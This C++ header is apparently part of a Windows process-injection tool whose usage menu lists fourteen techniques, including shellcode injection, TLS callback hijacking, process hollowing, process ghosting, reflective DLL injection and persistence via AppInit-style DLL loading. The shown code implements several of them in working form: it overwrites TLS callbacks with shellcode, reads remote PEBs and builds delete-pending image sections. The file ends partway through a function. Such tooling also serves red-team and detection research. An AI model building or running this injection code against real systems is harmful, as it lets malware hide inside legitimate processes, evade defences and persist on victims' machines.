#pragma once

#pragma warning(disable : 4996)

#include "Struct.h"

struct PROCESS_INFO
{
    DWORD PID;
    HANDLE MainThreadHandle;
};

struct MODULE_INFO
{
    DWORD MainModuleSize;
    BYTE* MainModuleAddress;
};

#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)


DWORD TypeofInjection;
DWORD ProcessID;
WCHAR DLLPath[MAX_PATH];
WCHAR ExportFunctionName[MAX_PATH];
WCHAR ProcessName[MAX_PATH];
WCHAR SourceProcessName[MAX_PATH];
WCHAR ShellCodePath[MAX_PATH];

void PrintUsage();
void ParseCommandLineArgument(int argc, WCHAR* argv[]);
DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]);
DWORD GetProcessIDFromName(WCHAR* ProcName);
BYTE* ReadDataFromFile(WCHAR* FileName);
BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo, DWORD CreationFlag);
void ResumeProcess(HANDLE hThread);
void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo);
int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo, BYTE* ShellCode,DWORD ShellCodeSize);
PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase);
PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase);
char* GetDLLName(DWORD64 dwImageBase, IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor);
IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader);
PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory);
DWORD64  FindRemotePEB(HANDLE hProcess);
PEBmy*  ReadRemotePEB(HANDLE hProcess);
PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress);
WORD GetPEFileArchitecture(BYTE* dwImageBase);
DWORD GetEntryPointRVA(BYTE* dwImageBase);
HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize);
BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath);
LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect);
BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi);
DWORD  LoadRemoteLibraryR(HANDLE hProcess, BYTE* SourceFileData, LPVOID lpParameter);
HANDLE MakeTransactedSection(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize);
DWORD CreateProcessFromSecion(HANDLE hSection, BYTE* PayloadData, WCHAR* TargetProcessName);

void PrintUsage() {
    printf("Usage: Process_Injection_Techniques.exe <Type of injection 1-9> <Flags>\n");
    printf("============================================\n");
    printf("Types Of injection and its flages\n");
    printf("============================================\n");
    
    printf("Inject Dll in another process using CreateRemoteThread API\n");
    printf("Process_Injection_Techniques.exe 1 -p <PID> -d <Dll Full Path>\n\n");
    
    printf("Inject Dll in another process using SetWindowsHookExW API.\nNOTE: the target process should has GUI to load the dll in it, and the exprted function should check in what process it runs in before doing its work\n");
    printf("Process_Injection_Techniques.exe 2  -d <Dll Full Path> -e <Export Function name it the Dll>\n\n");
    
    printf("Inject ShellCode in another process using CreateRemoteThread API\n");
    printf("Process_Injection_Techniques.exe 3 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using QueueUserAPC API.\nNOTE: the shellcode should handle the fact it will run more that once (# of threads in the process in the time of injection)\n");
    printf("Process_Injection_Techniques.exe 4 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using Early Bird Technique\n");
    printf("Process_Injection_Techniques.exe 5 -n <Executable Full Path> -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using TLS CallBack Technique.\nNOTE: the executable that you try to inject should containg TLS Callback section.\nTODO: If the executble does not has TLS Section Create new one and edit PE header.\n");
    printf("You Can inject running process the TLS Callback will be trigered when new thread is created or when thread exits, or you can start application and make it run your TLS before its EntryPoint\n");
    printf("Process_Injection_Techniques.exe 6 {-p <PID> OR -n <Executable Full Path>} -s <ShellCode Full Path>\n\n");

    printf("Inject ShellCode in another process using Thread execution hijacking\n");
    printf("Process_Injection_Techniques.exe 7 -p <PID> -s <ShellCode Full Path>\n\n");

    printf("Inject PE in another process using Process Hollowing\n");
    printf("Note:Crash with some 64bit executable (like Syste32\Svchost.exe,..)\n");
    printf("Process_Injection_Techniques.exe 8 -t <Target Executable Full Path to inject> -n <Source Executable Full Path to be injected>\n\n");

    printf("Inject Dll in All process that uses User32.dll(GUI Executable), Will Work also as persistence technique\n");
    printf("Note:Will not work when Secure Boot is On\n");
    printf("Process_Injection_Techniques.exe 9 -d <DLL Full Path>\n\n");

    printf("Execute your Process when the target process start, Will Work also as persistence technique\n");
    printf("Process_Injection_Techniques.exe 10 -n <Target Process name> -d <Your Executable Path>\n\n");

    printf("Inject Dll in All process that Calls (CreateProcess*, WinExe,..) and can prevent process from creation by return Error Code, Will Work also as persistence technique\n");
    printf("Note:The Dll Must Export CreateProcessNotify(LPCWSTR lpApplicationName, REASON enReason) as this function will be called, See Refrence[1] in the README\n");
    printf("Process_Injection_Techniques.exe 11 -d <DLL Full Path>\n\n");

    printf("inject process inside other process using Process Ghosting\n");
    printf("Process_Injection_Techniques.exe 12 -n <Target Executable> -d <your payload path>\n\n");

    printf("inject process inside other process using Reflective DLL Injection\n");
    printf("Note:The Dll Should Depend only on kernel32.dll and ntdll.dll for stability, as they are loaded at the same base address for all processes on the system, See Refrence[6] in the README for more info\n");
    printf("Process_Injection_Techniques.exe 13 -p <PID> -d <your payload path>\n\n");

    printf("inject process inside other process using Process DoppelGanging\n");
    printf("Note: it does not work on windows 10\n");
    printf("Process_Injection_Techniques.exe 14 -n <Target Process name> -d <Your Executable Path>\n\n");
}

void ParseCommandLineArgument(int argc, WCHAR* argv[]) {
    int InjectionType = _wtoi(argv[1]);
    int index = 0;
    switch (InjectionType) {
    case 1:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 2:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(ExportFunctionName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-e");
        wcscpy(DLLPath, argv[index]);
        break;

    case 3:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 4:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 5:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 6:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        if (index == -1) {
            printf("Suppy Argument for the %S Switch\n", L"-s");
            exit(0);
        }
        wcscpy(ShellCodePath, argv[index]);

        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        if (index == -1) {
            index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
            if (index == -1) {
                printf("Suppy -p <PID> or -n <Executable> to inject\n");
                exit(0);
            }
            wcscpy(ProcessName, argv[index]);
            break;
        }
        ProcessID = _wtoi(argv[index]);

        break;

    case 7:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-s");
        wcscpy(ShellCodePath, argv[index]);
        break;

    case 8:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-t");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 9:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;
    
    case 10:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 11:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 12:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    case 13:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-p");
        ProcessID = _wtoi(argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(DLLPath, argv[index]);
        break;

    case 14:
        index = GetIndexFromCommndLineArgument(argc, argv, L"-n");
        wcscpy(ProcessName, argv[index]);
        index = GetIndexFromCommndLineArgument(argc, argv, L"-d");
        wcscpy(SourceProcessName, argv[index]);
        break;

    default:
        PrintUsage();
        exit(0);
        break;
    }
}

DWORD GetIndexFromCommndLineArgument(int argc, WCHAR* argv[], CONST WCHAR ArgumentValue[]) {
    for (int i = 0; i < argc; i++) {
        if (wcscmp(argv[i], ArgumentValue) == 0 && i < argc - 1) {
            return i + 1;
        }
    }
    int InjectionType = _wtoi(argv[1]);
    if (InjectionType != 6) {
        printf("Suppy Argument for the %S Switch\n", ArgumentValue);
        exit(0);
    }
    return -1;
}

DWORD GetProcessIDFromName(WCHAR* ProcName) {

    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD PID = -1;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        return(FALSE);
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);
        return -1;
    }
    do
    {
        if (wcscmp(pe32.szExeFile, ProcName) == 0) {
            PID = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    return PID;
}

BYTE* ReadDataFromFile(WCHAR* FileName) {

    HANDLE hFile = NULL; 
    BOOL bResult = FALSE;
    DWORD cbRead = 0;

    hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed To Open Handle To File %S Error Code is 0x%x\n", FileName, GetLastError());
        return NULL;
    }

    int FileSize = GetFileSize(hFile, 0);
    if (FileSize == INVALID_FILE_SIZE) {
        printf("Failed To get File size Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    BYTE* FileContents = new BYTE[FileSize];
    ZeroMemory(FileContents, FileSize);

    bResult = ReadFile(hFile, FileContents, FileSize, &cbRead, NULL);
    if (bResult == FALSE) {
        printf("Failed To Read File Data Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    CloseHandle(hFile);
    return FileContents;
}

DWORD GetSizeOfFile(WCHAR *FileName) {
    HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    DWORD FileSize = GetFileSize(hFile, 0);
    if (FileSize == INVALID_FILE_SIZE) {
        printf("Failed To get File size Error Code is 0x%x\n", GetLastError());
        return NULL;
    }

    CloseHandle(hFile);
    return FileSize;
}

BOOL StartExecutable(WCHAR* ExecutablePath, PROCESS_INFO* ProcessInfo,DWORD CreationFlag) {
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    si.cb = sizeof(si);


    if (CreateProcessW(NULL, ExecutablePath, NULL, NULL, FALSE, CreationFlag, NULL, NULL, &si, &pi) == FALSE) {
        printf("Failed to Create Process %S Error code is 0x%x\n", ExecutablePath, GetLastError());
        return NULL;
    }

    CloseHandle(pi.hProcess);
    ProcessInfo->MainThreadHandle = pi.hThread;
    ProcessInfo->PID = pi.dwProcessId;

    return 1;
}

void ResumeProcess(HANDLE hThread) {
    ResumeThread(hThread);
}

void GetMainModuleInfo(DWORD PID, MODULE_INFO* ProcessInfo)
{
    HANDLE hSnapShot;

    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);
    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        printf("CreateToolhelp32Snapshot %x\n", GetLastError());
        //GetLastErrorBox(NULL, "Cannot create snapshot");
        return;
    }
    MODULEENTRY32 ModuleEntry32;
    ModuleEntry32.dwSize = sizeof(ModuleEntry32);
    if (Module32First(hSnapShot, &ModuleEntry32))
    {
        do
        {
            wchar_t* pwc;
            pwc = wcsstr(ModuleEntry32.szModule, L".exe");
            if (pwc) {
                printf("found  %p  %d \n", ModuleEntry32.modBaseAddr, ModuleEntry32.dwSize);
                ProcessInfo->MainModuleAddress = ModuleEntry32.modBaseAddr;
                ProcessInfo->MainModuleSize = ModuleEntry32.dwSize;
            }

        } while (Module32Next(hSnapShot, &ModuleEntry32));
    }
    CloseHandle(hSnapShot);
    return ;

}

int ChangeTheTLSCallBackFunctionInRemoteProcess(DWORD PID, MODULE_INFO* ModuleInfo,BYTE* ShellCode,DWORD ShellCodeSize) {

    DWORD NumberOfElementToGetFromTLSArray = 15;;
    DWORD OldProtection = 0;
    DWORD Status = NULL;
    LPVOID ShelCodeAddress = NULL;
    SIZE_T written = NULL;

    
    BYTE* LocalCopyOfMainModule = new BYTE[ModuleInfo->MainModuleSize];
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    Status = ReadProcessMemory(hProcess, ModuleInfo->MainModuleAddress, LocalCopyOfMainModule, ModuleInfo->MainModuleSize, 0);

    ULONG size;
    PIMAGE_TLS_DIRECTORY32 TLSDirectory = (PIMAGE_TLS_DIRECTORY32)ImageDirectoryEntryToData(LocalCopyOfMainModule, TRUE, IMAGE_DIRECTORY_ENTRY_TLS, &size);
    if (TLSDirectory) {
        printf( "in before\n");
        printf("Base is %p\n", LocalCopyOfMainModule);
        printf("TLSDirectory  %p  \n", TLSDirectory);

        
        PIMAGE_TLS_DIRECTORY32 TLSConfig = new IMAGE_TLS_DIRECTORY32;
        ReadProcessMemory(hProcess, ((BYTE*)TLSDirectory - (BYTE*)LocalCopyOfMainModule) + ModuleInfo->MainModuleAddress, TLSConfig, sizeof(IMAGE_TLS_DIRECTORY32), 0);

        
        //Dumping the List of TLS CallBacks

        /*DWORD* TLSCallBackLocationArray = new DWORD[NumberOfElementToGetFromTLSArray];
        ReadProcessMemory(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks, TLSCallBackLocationArray, sizeof(DWORD), 0);
        for (int i = 0; i < NumberOfElementToGetFromTLSArray; i++) {
            printf("TLS Fun # %d is %p\n", i, TLSCallBackLocationArray[i]);
        }*/

        Status = VirtualProtectEx(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks,  sizeof(DWORD), PAGE_EXECUTE_READWRITE, &OldProtection);
        if (!Status) {
            printf("Failed to chang  Memory protection in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
            return -1;
        }

        ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!ShelCodeAddress) {
            printf("Failed to Allocate Memory in process PID %d  Error Code is 0x%x\n", PID, GetLastError());
            return -1;
        }

        printf("the ShellCode Address at  %p\n", ShelCodeAddress);
        Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, ShellCodeSize, &written);
        if (!Status) {
            printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
            return -1;
        }


        Status = WriteProcessMemory(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks, &ShelCodeAddress, sizeof(DWORD), &written);       
        if (!Status) {
            printf("Failed to write to memory %x\n", GetLastError());
            return -1;
        }

        Status = VirtualProtectEx(hProcess, (BYTE*)TLSConfig->AddressOfCallBacks,  sizeof(DWORD), OldProtection, &OldProtection);
        if (!Status) {
            printf("Failed to chang  Memory protection Back To Original Value in process PID %d  Error Code is0x%x\n", PID, GetLastError());
        }

    }
    else {
        printf("No TLS CallBack in the Executable you Choose\n");
        return -1;
    }

    return 0;
}

PIMAGE_NT_HEADERS  GetNTHeaders(DWORD64 dwImageBase) {
    return (PIMAGE_NT_HEADERS)(dwImageBase + ((PIMAGE_DOS_HEADER)dwImageBase)->e_lfanew);
}

PLOADED_IMAGE  GetLoadedImage(DWORD64 dwImageBase)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dwImageBase;

    PIMAGE_NT_HEADERS pNTHeaders = GetNTHeaders(dwImageBase);
    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader = (PIMAGE_NT_HEADERS)(dwImageBase + pDosHeader->e_lfanew);

    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections = (PIMAGE_SECTION_HEADER)(dwImageBase + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    return pImage;
}

char* GetDLLName(DWORD64 dwImageBase,IMAGE_IMPORT_DESCRIPTOR ImageImportDescriptor)
{
    return (char*)(dwImageBase + ImageImportDescriptor.Name);
}

IMAGE_DATA_DIRECTORY  GetImportDirectory(PIMAGE_NT_HEADERS pFileHeader)
{
    return pFileHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
}

PIMAGE_IMPORT_DESCRIPTOR  GetImportDescriptors(PIMAGE_NT_HEADERS pFileHeader, IMAGE_DATA_DIRECTORY ImportDirectory)
{
    return (PIMAGE_IMPORT_DESCRIPTOR)(pFileHeader->OptionalHeader.ImageBase +
        ImportDirectory.VirtualAddress);
}

DWORD64 FindRemotePEB(HANDLE hProcess)
{
    HMODULE hNTDLL = LoadLibraryA("ntdll");

    if (!hNTDLL) {
        printf("Error Loading Library Error Code 0x%x\n", GetLastError());
        return -1;
    }

    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");

    if (!fpNtQueryInformationProcess) {
        printf("Error Get NtQueryInformationProcess Address Error Code 0x%x\n", GetLastError());
        return -1;
    }

    _NtQueryInformationProcess ntQueryInformationProcess = (_NtQueryInformationProcess)fpNtQueryInformationProcess;

    PROCESS_BASIC_INFORMATION* pBasicInfo = new PROCESS_BASIC_INFORMATION();

    DWORD dwReturnLength = 0;

    ntQueryInformationProcess(hProcess, 0, pBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);

    return (DWORD64)pBasicInfo->PebBaseAddress;
}

PEBmy* ReadRemotePEB(HANDLE hProcess)
{
    DWORD64 dwPEBAddress = FindRemotePEB(hProcess);

    PEBmy* pPEB = new PEBmy();
    size_t written = 0;

    BOOL bSuccess = ReadProcessMemory(hProcess, (LPCVOID)dwPEBAddress, (LPVOID)pPEB, sizeof(PEBmy), NULL);
    if (!bSuccess) {
        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
        return NULL;
    }

    return pPEB;
}

PLOADED_IMAGE  ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress)
{
    BYTE* lpBuffer = new BYTE[BUFFER_SIZE];

    BOOL bSuccess = ReadProcessMemory(hProcess, lpImageBaseAddress, lpBuffer, BUFFER_SIZE, 0);
    if (!bSuccess) {
        printf("Error Read Process mmory Error Code 0x%x\n", GetLastError());
        return NULL;
    }

    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;

    PLOADED_IMAGE pImage = new LOADED_IMAGE();

    pImage->FileHeader = (PIMAGE_NT_HEADERS)(lpBuffer + pDOSHeader->e_lfanew);

    pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;

    pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));

    return pImage;
}

WORD GetPEFileArchitecture(BYTE* dwImageBase) {
    void* ptr = GetNTHeaders((DWORD64)dwImageBase);
    if (ptr == NULL) return 0;

    IMAGE_NT_HEADERS32* inh = static_cast<IMAGE_NT_HEADERS32*>(ptr);
    return inh->FileHeader.Machine;
}

DWORD GetEntryPointRVA(BYTE* dwImageBase) {

    WORD PEArch = GetPEFileArchitecture(dwImageBase);
    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders((DWORD64)dwImageBase);
    if (pSourceHeaders == NULL) {
        return 0;
    }
    DWORD EntryPointRVA = 0;

    if (PEArch == IMAGE_FILE_MACHINE_AMD64) {
        IMAGE_NT_HEADERS64* PayLoadNTheader64 = (IMAGE_NT_HEADERS64*)pSourceHeaders;
        EntryPointRVA = PayLoadNTheader64->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        IMAGE_NT_HEADERS32* PayLoadNTheader32 = (IMAGE_NT_HEADERS32*)pSourceHeaders;
        EntryPointRVA = static_cast<ULONGLONG>(PayLoadNTheader32->OptionalHeader.AddressOfEntryPoint);
    }

    return EntryPointRVA;
}

HANDLE OpenFileNtdll(WCHAR* FilePath)
{
    // convert to NT path
    std::wstring NtPath = L"\\??\\" + std::wstring(FilePath);

    UNICODE_STRING FileName = { 0 };
    RtlInitUnicodeString(&FileName, NtPath.c_str());

    OBJECT_ATTRIBUTES attr = { 0 };
    InitializeObjectAttributes(&attr, &FileName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    IO_STATUS_BLOCK StatusBlock = { 0 };
    HANDLE hFile = INVALID_HANDLE_VALUE;
    NTSTATUS stat = NtOpenFile(&hFile, DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
        &attr, &StatusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
    );
    if (!NT_SUCCESS(stat)) {
        printf("Failed To Create Target File Eror Code is %x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    return hFile;
}

HANDLE GetSectionHandleFromFileThenDeleteFileOnClose(WCHAR* filePath, BYTE* payladBuf, DWORD payloadSize)
{
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _NtSetInformationFile fnNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(hNTDLL, "NtSetInformationFile");
    _NtWriteFile fnNtWriteFile = (_NtWriteFile)GetProcAddress(hNTDLL, "NtWriteFile");
    _NtCreateSection fnNtCreateSection = (_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection");
    _NtClose fnNtClose = (_NtClose)GetProcAddress(hNTDLL, "NtClose");

    HANDLE hDelFile = OpenFileNtdll(filePath);
    if (!hDelFile || hDelFile == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    NTSTATUS status = 0;
    IO_STATUS_BLOCK StatusBlock = { 0 };

    /* Set disposition flag */
    FILE_DISPOSITION_INFORMATION info = { 0 };
    info.DeleteFile = TRUE;

    status = fnNtSetInformationFile(hDelFile, &StatusBlock, &info, sizeof(info), FILE_INFORMATION_CLASS(13));//FileDispositionInformation
    if (!NT_SUCCESS(status)) {
        printf("Failed to Setting information  Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    LARGE_INTEGER ByteOffset = { 0 };

    status = fnNtWriteFile(hDelFile, NULL, NULL, NULL, &StatusBlock, payladBuf, payloadSize, &ByteOffset, NULL);
    if (!NT_SUCCESS(status)) {
        printf("Failed to Write Data To File Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    HANDLE hSection = nullptr;
    status = fnNtCreateSection(&hSection,SECTION_ALL_ACCESS,NULL, 0, PAGE_READONLY, SEC_IMAGE, hDelFile);
    if (status != 0) {
        printf("Failed to Create Section Erro Code 0x%x\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    fnNtClose(hDelFile);
    hDelFile = nullptr;

    return hSection;
}

WCHAR* GetFileNameFromPath(WCHAR* FullPath)
{
    size_t len = wcslen(FullPath);
    for (size_t i = len - 2; i >= 0; i--) {
        if (FullPath[i] == '\\' || FullPath[i] == '/') {
            return FullPath + (i + 1);
        }
    }
    return FullPath;
}

WCHAR* GetDirectoryFromPath(WCHAR* FullPath, WCHAR* OutBuffer, const DWORD64 OutBufferSize)
{
    memset(OutBuffer, 0, OutBufferSize);
    memcpy(OutBuffer, FullPath, OutBufferSize);

    wchar_t* name_ptr = GetFileNameFromPath(OutBuffer);
    if (name_ptr != nullptr) {
        *name_ptr = '\0'; //cut it
    }
    return OutBuffer;
}

BOOL SetProcessParametar(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath)
{
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    _RtlCreateProcessParametersEx fnRtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNTDLL, "RtlCreateProcessParametersEx");

    UNICODE_STRING uTargetPath = { 0 };
    RtlInitUnicodeString(&uTargetPath, targetPath);

    WCHAR DirPath[MAX_PATH] = { 0 };
    GetDirectoryFromPath(targetPath, DirPath, MAX_PATH);

    //if the directory is empty, set the current one
    if (wcsnlen(DirPath, MAX_PATH) == 0) {
        GetCurrentDirectoryW(MAX_PATH, DirPath);
    }

    UNICODE_STRING uCurrentDir = { 0 };
    RtlInitUnicodeString(&uCurrentDir, DirPath);

    WCHAR dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    RtlInitUnicodeString(&uDllDir, dllDir);
    
    UNICODE_STRING uWindowName = { 0 };
    WCHAR windowName[] = L"Update";
    RtlInitUnicodeString(&uWindowName, windowName);

    LPVOID Environment;
    BOOL ret = CreateEnvironmentBlock(&Environment, NULL, TRUE);
    if (!ret) {
        printf("failed CreateEnvironmentBlock Error Code is %x\n", GetLastError());
        return -1;
    }

    PRTL_USER_PROCESS_PARAMETERSMy params = nullptr;

    NTSTATUS status = fnRtlCreateProcessParametersEx(&params, (PUNICODE_STRING)&uTargetPath, (PUNICODE_STRING)&uDllDir, (PUNICODE_STRING)&uCurrentDir, (PUNICODE_STRING)&uTargetPath, Environment,
                                                    (PUNICODE_STRING)&uWindowName, nullptr, nullptr, nullptr, RTL_USER_PROC_PARAMS_NORMALIZED);

    if (status != 0) {
        printf("failed RtlCreateProcessParametersEx Error Code 0x%x\n", GetLastError());
        return -1;
    }

    LPVOID RemoteParametar = WriteParameterinProcess(hProcess, params, PAGE_READWRITE);
    if (!RemoteParametar) {
        printf("failed Cannot make a remote copy of parameters Error Code 0x%x\n", GetLastError());
        return -1;
    }

    PEBmy* PebCopy = ReadRemotePEB(hProcess);

    if (!SetPEBparameter(RemoteParametar, hProcess, pi)) {
        printf("failed Cannot update Remote PEB Error Code 0x%x\n", GetLastError());
        return -1;
    }

    return 0;
}

LPVOID WriteParameterinProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERSMy params, DWORD protect)
{
    if (params == NULL) return NULL;

    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    //params and environment in one space:
    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end) {
            buffer_end = env_end;
        }
    }
    // copy the continuous area containing parameters + environment
    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
            printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
        if (params->Environment) {
            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
                printf("failed Writing environment Error Code 0x%x\n", GetLastError());
                return nullptr;
            }
        }
        return (LPVOID)params;
    }

    // could not copy the continuous space, try to fill it as separate chunks:
    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        printf("failed Allocating RemoteProcessParams failed Error Code 0x%x\n", GetLastError());
        return nullptr;
    }
    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
        printf("failed Writing RemoteProcessParams Error Code 0x%x\n", GetLastError());
        return nullptr;
    }
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            printf("failed Allocating environment Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
            printf("failed Writing environment Error Code 0x%x\n", GetLastError());
            return nullptr;
        }
    }
    return (LPVOID)params;
}

BOOL SetPEBparameter(PVOID ParametarBase, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
{
